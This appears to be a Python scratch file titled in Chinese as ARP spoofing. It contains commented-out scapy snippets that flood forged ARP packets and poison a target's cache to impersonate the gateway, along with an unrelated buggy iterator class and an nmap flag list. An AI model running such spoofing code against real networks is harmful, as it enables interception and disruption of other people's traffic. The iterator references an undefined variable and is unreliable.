#ARP欺骗
from scapy.all import *
import time
import netifaces as ni
import shlex
import shutil
import os

#构造包
#pdst是目标IP，psrc是网关的ip
# p1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=GET_MAC("Intel(R) Ethernet Connection (2) I219-V"))/ARP(pdst="52.1.1.66", psrc="52.1.1.67")
# p2 = Ether(dst="ff:ff:ff:ff:ff:ff", src=GET_MAC("Intel(R) Ethernet Connection (2) I219-V"))/ARP(pdst="52.1.1.67", psrc="52.1.1.66")
# for i in range(6000):
#     sendp(p1)
#     sendp(p2)
#     time.sleep(0.1)

#
# def spoofarpcache():
#     target_ip = "192.168.1.149"
#     target_mac = "b8:d4:3e:58:b7:95"
#     packet = ARP(op=2, pdst=target_ip, psrc="192.168.1.1", hwdst=target_mac, hwsrc="00:00:00:00:00:01")
#     send(packet, verbose=False)
#
# while True:
#     spoofarpcache()
#     time.sleep(0.1)



class MyIter:
    def __init__(self):
        self._start = 0
        self.b = []

    def __iter__(self):

        return self

    def __next__(self):
        if self._start < 10:
            self._start += 1
            return self._start
        else:
            self.b.append(a)
            raise StopIteration

NMAP_DEFAULT_FLAGS = {
    '-p22': 'Port 22 scanning',
    '-T4': 'Aggressive timing template',
    '-PE': 'Enable this echo request behavior. Good for internal networks',
    '--disable-arp-ping': 'No ARP or ND Ping',
    '--max-hostgroup 50': 'Hostgroup (batch of hosts scanned concurrently) size',
    '--min-parallelism 50': 'Number of probes that may be outstanding for a host group',
    '--osscan-limit': 'Limit OS detection to promising targets',
    '--max-os-tries 1': 'Maximum number of OS detection tries against a target',
    '-oX -': 'Send XML output to STDOUT, avoid creating a temp file'
}
__NMAP__FLAGS__ = shlex.split(" ".join(NMAP_DEFAULT_FLAGS.keys()))
print(__NMAP__FLAGS__)

if __name__ == '__main__':
    b = []
    b.extend(__NMAP__FLAGS__)
    b.append("ddd")
    print(b)
